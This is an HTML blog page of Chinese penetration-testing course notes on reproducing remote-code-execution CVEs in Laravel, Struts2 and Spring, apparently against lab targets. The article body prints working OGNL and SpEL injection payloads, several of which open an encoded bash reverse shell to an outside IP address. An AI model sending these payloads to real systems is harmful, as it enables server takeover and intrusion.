@@ -1,0 +1,237 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP | ai潼</title><meta name="author" content="pwy"><meta name="copyright" content="pwy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="#知识点： 中间件及框架列表： IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等 1、开发框架-PHP-Laravel-Thinkphp 2、开发框架-Ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP">
+<meta property="og:url" content="http://example.com/2023/03/13/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/index.html">
+<meta property="og:site_name" content="ai潼">
+<meta property="og:description" content="#知识点： 中间件及框架列表： IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等 1、开发框架-PHP-Laravel-Thinkphp 2、开发框架-Ja">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-2036ce2301f3d14ae389e3f79282a682_1440w.webp">
+<meta property="article:published_time" content="2023-03-13T09:59:58.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:38:13.522Z">
+<meta property="article:author" content="pwy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic3.zhimg.com/80/v2-2036ce2301f3d14ae389e3f79282a682_1440w.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/13/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day62 服务攻防-框架安全&CVE复现&Spring&Struts&Laravel&ThinkPHP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-19 17:38:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ai潼" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tt.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic3.zhimg.com/80/v2-2036ce2301f3d14ae389e3f79282a682_1440w.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="ai潼"><span class="site-name">ai潼</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-13T09:59:58.000Z" title="发表于 2023-03-13 17:59:58">2023-03-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-19T09:38:13.522Z" title="更新于 2023-03-19 17:38:13">2023-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/">服务攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313183111633.png" alt="image-20230313183111633"></p>
+<p>中间件及框架列表：</p>
+<p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p>
+<p>1、开发框架-PHP-Laravel-Thinkphp</p>
+<p>2、开发框架-Javaweb-St2-Spring</p>
+<p>3、开发框架-Python-django-Flask</p>
+<p>4、开发框架-Javascript-Node.js-JQuery</p>
+<h3 id="常见语言开发框架："><a href="#常见语言开发框架：" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h3><p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等(前三个比较多)</p>
+<p>JAVA：Spring Springboot MyBatis Hibernate Struts2等(前两个比较多)</p>
+<p>Python：Django Flask Bottle Turbobars Tornado Web2py等(前两个比较多)</p>
+<p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等(前两个比较多)</p>
+<h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p>
+<p>1、配置不当-解析&amp;弱口令</p>
+<p>2、安全机制-特定安全漏洞</p>
+<p>3、安全机制-弱口令爆破攻击</p>
+<p>4、安全应用-框架特定安全漏洞</p>
+<h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>-中间件安全测试流程：</p>
+<p>1、判断中间件信息-名称&amp;版本&amp;三方</p>
+<p>2、判断中间件问题-配置不当&amp;公开漏洞</p>
+<p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
+<h3 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="-应用服务安全测试流程：见图"></a>-应用服务安全测试流程：见图</h3><p>1、判断服务开放情况-端口扫描&amp;组合应用等</p>
+<p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p>
+<p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p>
+<h3 id="开发框架组件安全测试流程："><a href="#开发框架组件安全测试流程：" class="headerlink" title="-开发框架组件安全测试流程："></a>-开发框架组件安全测试流程：</h3><p>1、判断常见语言开发框架类型</p>
+<p>2、判断开发框架存在的CVE问题</p>
+<p>3、判断开发框架CVE漏洞利用方式</p>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ PHP-开发框架安全-Thinkphp&amp;Laravel</p>
+<p>➢ JAVAWEB-开发框架安全-Spring&amp;Struts2</p>
+<h4 id="PHP-开发框架安全-Thinkphp-amp-Laravel"><a href="#PHP-开发框架安全-Thinkphp-amp-Laravel" class="headerlink" title="#PHP-开发框架安全-Thinkphp&amp;Laravel"></a>#PHP-开发框架安全-Thinkphp&amp;Laravel</h4><p>-Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。</p>
+<blockquote>
+<p>CVE-2021-3129 RCE</p>
+<p>复现：getshell脚本</p>
+<p>Laravel &lt;&#x3D; 8.4.2</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313195844005.png" alt="image-20230313195844005"></p>
+</blockquote>
+<p>Thinkphp-3.X RCE-5.X RCE</p>
+<p>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架</p>
+<p>武器库-Thinkphp专检</p>
+<h4 id="JAVAWEB-开发框架安全-Spring-amp-Struts2"><a href="#JAVAWEB-开发框架安全-Spring-amp-Struts2" class="headerlink" title="#JAVAWEB-开发框架安全-Spring&amp;Struts2"></a>#JAVAWEB-开发框架安全-Spring&amp;Struts2</h4><h5 id="Struts2是一个基于MVC设计模式的Web应用框架"><a href="#Struts2是一个基于MVC设计模式的Web应用框架" class="headerlink" title="Struts2是一个基于MVC设计模式的Web应用框架"></a>Struts2是一个基于MVC设计模式的Web应用框架</h5><h6 id="1、2020前漏洞"><a href="#1、2020前漏洞" class="headerlink" title="1、2020前漏洞"></a>1、2020前漏洞</h6><p>武器库-st2专检</p>
+<h6 id="2、cve-2020-17530"><a href="#2、cve-2020-17530" class="headerlink" title="2、cve_2020_17530"></a>2、cve_2020_17530</h6><p>脚本：<a target="_blank" rel="noopener" href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
+<p>手工：</p>
+<p>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-1</p>
+<p>——1</p>
+<p>Content-Disposition: form-data; name&#x3D;”id”</p>
+<p>%{(#instancemanager&#x3D;#application[“org.apache.tomcat.InstanceManager”]).(#stack&#x3D;#attr[“com.opensymphony.xwork2.util.ValueStack.ValueStack”]).(#bean&#x3D;#instancemanager.newInstance(“org.apache.commons.collections.BeanMap”)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(“context”)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(“memberAccess”)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(“java.util.HashSet”)).(#bean.put(“excludedClasses”,#emptyset)).(#bean.put(“excludedPackageNames”,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(“java.util.ArrayList”)).(#arglist.add(“id”)).(#execute&#x3D;#instancemanager.newInstance(“freemarker.template.utility.Execute”)).(#execute.exec(#arglist))}</p>
+<p>——1–</p>
+<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>id&#x3D;%25%7b%28%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%3d%23%61%70%70%6c%69%63%61%74%69%6f%6e%5b%22%6f%72%67%2e%61%70%61%63%68%65%2e%74%6f%6d%63%61%74%2e%49%6e%73%74%61%6e%63%65%4d%61%6e%61%67%65%72%22%5d%29%2e%28%23%73%74%61%63%6b%3d%23%61%74%74%72%5b%22%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%75%74%69%6c%2e%56%61%6c%75%65%53%74%61%63%6b%2e%56%61%6c%75%65%53%74%61%63%6b%22%5d%29%2e%28%23%62%65%61%6e%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%42%65%61%6e%4d%61%70%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%73%74%61%63%6b%29%29%2e%28%23%63%6f%6e%74%65%78%74%3d%23%62%65%61%6e%2e%67%65%74%28%22%63%6f%6e%74%65%78%74%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%63%6f%6e%74%65%78%74%29%29%2e%28%23%6d%61%63%63%3d%23%62%65%61%6e%2e%67%65%74%28%22%6d%65%6d%62%65%72%41%63%63%65%73%73%22%29%29%2e%28%23%62%65%61%6e%2e%73%65%74%42%65%61%6e%28%23%6d%61%63%63%29%29%2e%28%23%65%6d%70%74%79%73%65%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%48%61%73%68%53%65%74%22%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%62%65%61%6e%2e%70%75%74%28%22%65%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%22%2c%23%65%6d%70%74%79%73%65%74%29%29%2e%28%23%61%72%67%6c%69%73%74%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%41%72%72%61%79%4c%69%73%74%22%29%29%2e%28%23%61%72%67%6c%69%73%74%2e%61%64%64%28%22%77%68%6f%61%6d%69%22%29%29%2e%28%23%65%78%65%63%75%74%65%3d%23%69%6e%73%74%61%6e%63%65%6d%61%6e%61%67%65%72%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%29%29%2e%28%23%65%78%65%63%75%74%65%2e%65%78%65%63%28%23%61%72%67%6c%69%73%74%29%29%7d</p>
+<p>3、cve_2021_31805</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
+<h5 id="Spring框架是由于软件开发的复杂性而创建的。"><a href="#Spring框架是由于软件开发的复杂性而创建的。" class="headerlink" title="Spring框架是由于软件开发的复杂性而创建的。"></a>Spring框架是由于软件开发的复杂性而创建的。</h5><p>springboot特有的报错页面</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230319173233219.png" alt="image-20230319173233219"></p>
+<h6 id="1、cve-2017-4971-Spring-Web-Flow"><a href="#1、cve-2017-4971-Spring-Web-Flow" class="headerlink" title="1、cve_2017_4971-Spring Web Flow"></a>1、cve_2017_4971-Spring Web Flow</h6><p>Spring WebFlow 2.4.0 - 2.4.4</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/322/">https://paper.seebug.org/322/</a></p>
+<p>_eventId_confirm&#x3D;&amp;<em>csrf&#x3D;e06e1d86-e083-45f7-b700-567b5f7f5d30&amp;</em>(new+java.lang.ProcessBuilder(“bash”,”-c”,”bash+-i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566+0&gt;%261”)).start()&#x3D;vulhub</p>
+<h6 id="2、cve-2018-1273-Spring-Data-Commons"><a href="#2、cve-2018-1273-Spring-Data-Commons" class="headerlink" title="2、cve_2018_1273-Spring Data Commons"></a>2、cve_2018_1273-Spring Data Commons</h6><p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</p>
+<p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p>
+<p>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</p>
+<p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
+<p>编码：bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}，不编码直接执行反弹不成功</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313211552806.png" alt="image-20230313211552806"></p>
+<p>原因是此处接收数据时urlencoded</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313213148636.png" alt="image-20230313213148636"></p>
+<p>编码后：</p>
+<p>username[#this.getClass().forName(“java.lang.Runtime”).getRuntime().exec(“%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%30%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d”)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313211714594.png" alt="image-20230313211714594"></p>
+<p>虽然返回500，但是shell实际已经反弹成功了</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313211849477.png" alt="image-20230313211849477"></p>
+<p>小知识点：burp修改了host以后同时需要改右上角的target</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313210136960.png" alt="image-20230313210136960"></p>
+<h6 id="3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入"><a href="#3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入" class="headerlink" title="3、CVE-2022-22963 Spring Cloud Function Spel表达式注入"></a>3、CVE-2022-22963 Spring Cloud Function Spel表达式注入</h6><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p>
+<p>Connection: close</p>
+<p>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(“bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”)</p>
+<p>页面显示：</p>
+<p><img src="/../images/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/image-20230313213400177.png" alt="image-20230313213400177"></p>
+<p>抓取数据包，发送payload，发现不编码能反弹shell，编码后反而不能反弹,原因是请求方式不同</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pwy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/13/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/">http://example.com/2023/03/13/Day62-服务攻防-框架安全-CVE复现-Spring-Struts-Laravel-ThinkPHP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">ai潼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://pic3.zhimg.com/80/v2-2036ce2301f3d14ae389e3f79282a682_1440w.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/13/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/" title="Day63 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery"><img class="cover" src="https://pic3.zhimg.com/80/v2-88e2d2400c7844ba02d11a18b13d65b6_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day63 